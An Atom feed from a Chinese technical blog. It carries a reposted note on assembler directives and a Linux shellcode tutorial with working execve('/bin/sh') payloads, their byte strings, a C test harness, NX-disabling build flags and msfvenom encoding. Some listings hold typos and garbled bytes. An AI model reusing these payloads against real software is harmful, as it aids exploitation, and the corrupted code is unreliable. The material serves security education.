<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术栈</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-08-05T13:12:06.936Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux汇编之伪指令</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/</id>
    <published>2022-08-05T12:56:04.000Z</published>
    <updated>2022-08-05T13:12:06.936Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Reesun<br>链接：<a href="http://blog.chinaunix.net/uid-20548989-id-1667484.html">http://blog.chinaunix.net/uid-20548989-id-1667484.html</a><br>来源：Chinaunix</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br></pre></td></tr></table></figure><p>汇编程序中以<code>.</code>开头的名称并不是指令的助记符，不会被翻译成机器指令，而是给汇编器一些特殊指示，称为汇编指示（Assembler Directive）或伪操作（Pseudo-operation），由于它不是真正的指令所以加个“伪”字。<code>.section</code>指示把代码划分成若干个段（Section），程序被操作系统加载执行时，每个段被加载到不同的地址，操作系统对不同的页面设置不同的读、写、执行权限。</p><p><code>.data</code>段保存程序的数据，是<mark>可读可写</mark>的，相当于C程序的全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br></pre></td></tr></table></figure><p><code>.text</code>段保存代码，是<mark>只读和可执行</mark>的，后面那些指令都属于<code>.text</code>段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br></pre></td></tr></table></figure><p><code>_start</code>是一个符号（Symbol），符号在汇编程序中<mark>代表一个地址</mark>，可以用在指令中，汇编程序经过汇编器的处理之后，所有的符号都被替换成它所代表的地址值。在C语言中我们通过变量名访问一个变量，其实就是读写某个地址的内存单元，我们通过函数名调用一个函数，其实就是跳转到该函数第一条指令所在的地址，所以变量名和函数名都是符号，本质上是代表内存地址的。</p><p><code>.globl</code>指示告诉汇编器，<code>_start</code>这个符号要被链接器用到，所以要在目标文件的符号表中标记它是一个全局符号（在<a href="http://learn.akae.cn/media/ch18s05.html#asm.relocatable">第 5.1 节 “目标文件”</a>详细解释）。<code>_start</code>就像C程序的<code>main</code>函数一样特殊，是<mark>整个程序的入口</mark>，链接器在链接时会查找目标文件中的<code>_start</code>符号代表的地址，把它设置为整个程序的入口地址，所以每个汇编程序都要提供一个<code>_start</code>符号并且用<code>.globl</code>声明。<strong>如果一个符号没有用<code>.globl</code>声明，就表示这个符号不会被链接器用到</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br></pre></td></tr></table></figure><p>这里定义了<code>_start</code>符号，汇编器在翻译汇编程序时会计算每个数据对象和每条指令的地址，当看到这样一个符号定义时，就<strong>把它后面一条指令的地址作为这个符号所代表的地址</strong>。而<code>_start</code>这个符号又比较特殊，它所<strong>代表的地址是整个程序的入口地址</strong>，所以下一条指令<code>movl $1, %rdi</code>就成了程序中第一条被执行的指令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作者：Reesun&lt;br&gt;
链接：&lt;a href=&quot;http://blog.chinaunix.net/uid-20548989-id-1667484.html&quot;&gt;http://blog.chinaunix.net/uid-20548989-id-1667484.html&lt;</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux汇编伪指令" scheme="https://www.rgzzplus.com/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Linux—shellcode开发</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux%E2%80%94shellcode%E5%BC%80%E5%8F%91/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux%E2%80%94shellcode%E5%BC%80%E5%8F%91/</id>
    <published>2022-08-05T12:48:42.000Z</published>
    <updated>2022-08-07T14:02:07.734Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-什么是-shellcode"><a class="markdownIt-Anchor" href="#1-什么是-shellcode"></a> 1. 什么是 shellcode ？</h1><p>shellcode 通常用机器语言编写，是一段用于软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行 shell 而得名。随着发展，shellcode 现在代表将插入到漏洞利用程序中以完成所需任务的任何字节码。</p><h1 id="2-shellcode-原理"><a class="markdownIt-Anchor" href="#2-shellcode-原理"></a> 2. shellcode 原理</h1><h2 id="21-理解系统调用"><a class="markdownIt-Anchor" href="#21-理解系统调用"></a> 2.1 理解系统调用</h2><p>shellcode 通常是一段能够执行某些系统调用的代码，所以直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可。</p><p>Linux 操作系统（2.6及更早的内核版本），通常用 <code>int $0x80软中断 + 系统调用号</code>（保存到eax中）来实现系统调用，其<mark>参数传递顺序依次为 ebx、ecx、edx、esi和edi</mark>，返回值存放在eax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">int $0x80</span><br><span class="line"></span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure><p>编译执行（可编译成 64 位程序）：<mark>用gcc编译，生成目标文件，用ld来链接</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c hello32.S</span><br><span class="line">$ ld -m elf_i386 -o hello32 hello32.o</span><br><span class="line">$ strace ./hello32                                                                   127 ⨯</span><br><span class="line">execve(<span class="string">&quot;./hello32&quot;</span>, [<span class="string">&quot;./hello32&quot;</span>], 0x7ffd941ae900 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3197 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;hello 32-bit!\n&quot;</span>, 14hello 32-bit!</span><br><span class="line">)         = 14</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>虽然软中断 int 0x80 非常经典，但是由于其性能较差，<strong>在往后的内核中被快速调用指令代替，32 位系统使用 sysenter(对应 sysexit)指令，64 位系统则使用 syscall（对应 sysret）指令。</strong></p><h2 id="22-调用约定"><a class="markdownIt-Anchor" href="#22-调用约定"></a> 2.2 调用约定</h2><p>调用约定是对函数调用时如何传递参数的一种约定。</p><p>（1）内核接口</p><ul><li>x86-32 系统调用约定：Linux系统调用使用寄存器传递参数。<mark>eax 存放系统调用号（syscall_number），ebx、ecx、edx、esi 和 ebp 用于将6个参数传递给系统调用</mark>。返回值保存在 eax 中。所有其它寄存器（包括 EFLAGS）都保存在 int 0x80 中。</li><li>x86-64 系统调用约定：系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。==rax 存放系统调用号（syscall_namber）。内核接口使用的寄存器有 rdi、rsi、rdx、r10、r8 和 r9。==系统调用通过 syscall 指令完成。除了 rcx、r11 和 eax，其它寄存器都被保留。返回值保存在 rax 中，只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。、</li></ul><p>（2）用户接口</p><ul><li>x86-32 函数调用约定：<mark>参数通过栈进行传递</mark>。最后一个参数第一个被放入栈中，知道所有的参数都放置完毕，然后执行 call 指令。</li><li>x86-64 函数调用约定：<mark>x86-64 下通过寄存器传递参数</mark>，这样做比栈更有效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数类型是 <mark>MEMORY</mark>，则在<mark>栈上传递参数</mark>。如果类型是 <mark>INTEGER</mark>，则==顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。==如果多于 6 个参数，则后面的参数将在栈中传递。</li></ul><h3 id="22-32位程序使用-sysenter-的例子"><a class="markdownIt-Anchor" href="#22-32位程序使用-sysenter-的例子"></a> 2.2 *32位程序使用 sysenter 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;Hello sysenter!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text </span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br><span class="line"></span><br><span class="line">sysenter_ret:</span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 sysenter 指令，需要<strong>手动为其布置栈</strong>。这是因为 sysenter 返回时，会执行 _kernel_vsyscall 的后半部分（从 0xf7fd5059 开始）。_kernel_vsyscall 封装了 sysenter 调用的规范，是 vDSO 的一部分，而 vDSO 运行程序在用户层中执行代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disasseble __kernel_vsyscall</span><br><span class="line">0xf7fd5050 &lt;+0&gt;:push ecx</span><br><span class="line">0xf7fd5051 &lt;+1&gt;:push edx</span><br><span class="line">0xf7fd5052 &lt;+2&gt;:push ebp</span><br><span class="line">0xf7fd5053 &lt;+3&gt;:movebp,esp</span><br><span class="line">0xf7fd5055 &lt;+5&gt;:sysenter</span><br><span class="line">0xf7fd5057 &lt;+7&gt;:int 0x80</span><br><span class="line">--&gt;0xf7fd5059 &lt;+9&gt;:popebp</span><br><span class="line">0xf7fd505a &lt;+10&gt;:popedx</span><br><span class="line">0xf7fd505b &lt;+11&gt;:pop ecx</span><br><span class="line">0xf7fd505c &lt;+12&gt;:ret</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 64 位程序）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c sysenter32.S</span><br><span class="line">$ ld -m elf_i386 -o sysenter sysenter32.o</span><br><span class="line">$ strace ./sysenter</span><br><span class="line">execve(<span class="string">&quot;./sysenter&quot;</span>, [<span class="string">&quot;./sysenter&quot;</span>], 0x7ffe74dda6e0 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3638 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;Hello sysenter!\n&quot;</span>, 16Hello sysenter!</span><br><span class="line">)       = 16</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h3 id="23-64位程序使用-syscall-的例子"><a class="markdownIt-Anchor" href="#23-64位程序使用-syscall-的例子"></a> 2.3 *64位程序使用 syscall 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 32 位程序）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -c hello64.S</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -o hello64 hello64.o</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">strace ./hello64</span> </span><br><span class="line">execve(&quot;./hello64&quot;, [&quot;./hello64&quot;], 0x7fffe7d694a0 /* 61 vars */) = 0</span><br><span class="line">write(1, &quot;hello 64-bit!\n&quot;, 14hello 64-bit!</span><br><span class="line">)         = 14</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h1 id="3-编写简单-shellcode"><a class="markdownIt-Anchor" href="#3-编写简单-shellcode"></a> 3. 编写简单 shellcode</h1><p>shellcode 只是一段代码，为了运行和验证，我们通常用<strong>函数指针</strong>或者<strong>内联函数</strong>的方式把它嵌入到C程序中来调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//污染所有寄存器，确保shellcode 在任何环境下都能运行</span></span><br><span class="line">    <span class="comment">/* __asm__(</span></span><br><span class="line"><span class="comment">    &quot;mov %eax, %ebx\n\t&quot;</span></span><br><span class="line"><span class="comment">&quot;mov %eax, %ecx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %esi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %ebp\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;call shellcode&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <a href="http://www.shell-storm.org/shellcode/">shell-storm</a>找一些 shellcode 学习案例，先看一个实现 execve(&quot;/bin/sh&quot;) 的 Linux 32位的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">; int execve(const char *filename, char *const argv[], char *const envp[])</span><br><span class="line"></span><br><span class="line">xorecx, ecx; ecx = NULL</span><br><span class="line">mulecx; eax and edx = NULL</span><br><span class="line">moval, 11; execve syscall</span><br><span class="line">pushecx; string NULL</span><br><span class="line">push0x68732f2f; &quot;//sh&quot;</span><br><span class="line">push0x6e69622f; &quot;/bin&quot;</span><br><span class="line">movebx, esp; pointer to &quot;/bin/sh\0&quot; string</span><br><span class="line">int0x80; bingo</span><br></pre></td></tr></table></figure><p>首先用 NASM 对这段汇编代码进行编译，然后使用 ld 链接，运行后获得shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf32 tiny_execve_sh.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d tiny_execve_sh           \                                               127 ⨯</span></span><br><span class="line"></span><br><span class="line">tiny_execve_sh：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line">08049000 &lt;_start&gt;:</span><br><span class="line"> 8049000:       31 c9                   xor    %ecx,%ecx</span><br><span class="line"> 8049002:       f7 e1                   mul    %ecx</span><br><span class="line"> 8049004:       b0 0b                   mov    $0xb,%al</span><br><span class="line"> 8049006:       51                      push   %ecx</span><br><span class="line"> 8049007:       68 2f 2f 73 68          push   $0x68732f2f</span><br><span class="line"> 804900c:       68 2f 62 69 6e          push   $0x6e69622f</span><br><span class="line"> 8049011:       89 e3                   mov    %esp,%ebx</span><br><span class="line"> 8049013:       cd 80                   int    $0x80</span><br></pre></td></tr></table></figure><p>为了在 C 程序中使用这段 shellcode，我们需将其 <mark>opcode 提取</mark>出来（我这里 cut:无效的字段范围）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d ./tiny_execve_sh|grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span></span><br><span class="line">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br></pre></td></tr></table></figure><p>将提取出来的字符放到 C 程序的 shellcode[] 中。需要注意的是，shellcode 作为全局初始化变量，存放在 .data 段中，而编译时默认开启的 NX 保护机制，会将数据所在的内存页标识为不可执行，当程序转入 shellcode 执行时抛出异常。因此，下面需要关闭 NX。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -m32 -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh_shellcode</span></span><br></pre></td></tr></table></figure><p>Linux 64 位的 shellcode 也一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 tiny_execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 tiny_execve_sh64.o -o tiny_execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh64</span> </span><br></pre></td></tr></table></figure><h1 id="4-shellcode-变形"><a class="markdownIt-Anchor" href="#4-shellcode-变形"></a> 4. shellcode 变形</h1><p>有时，被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等可见字符、ASCII 和 Unicode 编码转换等，因此需要进行一些处理。</p><p>由于 NULL 会将字符串操作函数截断，所以我们需要用其它相似功能的指令来替代，下面是一个 32 位指令替换的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">替换前：</span><br><span class="line">B8 01000000 MOVEAX,1</span><br><span class="line"></span><br><span class="line">替换后：</span><br><span class="line">33C0XOR EAX,EAX</span><br><span class="line">40INC EAX</span><br></pre></td></tr></table></figure><p>对于只能使用可见字符字母（也就是只能用字母和数字组合）的情况，将 shellcode 的字符进行编码，使其符合限制条件。相应地，需要在 shellcode 中加入解码器，在代码行前将原始 shellcode 还原出来。</p><p>著名的渗透测试框架 Metasploit 中就集成了许多 shellcode 的编码器，这里我们选择 x86/alpha_mixed 来编码 32 位的 shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">msfvenom -1 encoders | grep -i alphanumeric</span></span><br><span class="line">x86/alpha_mixed lowAlpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">x86/alpha_upperlowAlpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">x86/unicode_mixedmanual Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">x86/unicode uDpermanual Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xel\xb0\x0b\x51\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">x68\:&lt;2f\x2f\xT?3\x68\x68\x2f\x62\x69\x6e\x89\xo3\xcd\x80&quot;)&#x27;</span> | msfveno -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufterRegister=EAX</span> </span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed </span><br><span class="line">x86/alpha_mixed succeeded with size 96 (iteration=0)</span><br><span class="line">x86/alpha mixed chosen with final size 96</span><br><span class="line">Payload size: 96 bytes</span><br><span class="line">PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9igHah04Ksa3XTodot31</span><br><span class="line">xBHtorBcYpnniis8MOpAA</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/lsgxeva/p/10794331.html">Linux下shellcode的编写</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/212610634">带你玩转 Linux Shellcode</a></p><p>​<a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a></p><p>​<a href="https://cloud.tencent.com/developer/article/1930058?from=article.detail.1799682">Linux下Shellcode编写</a></p><p>​<a 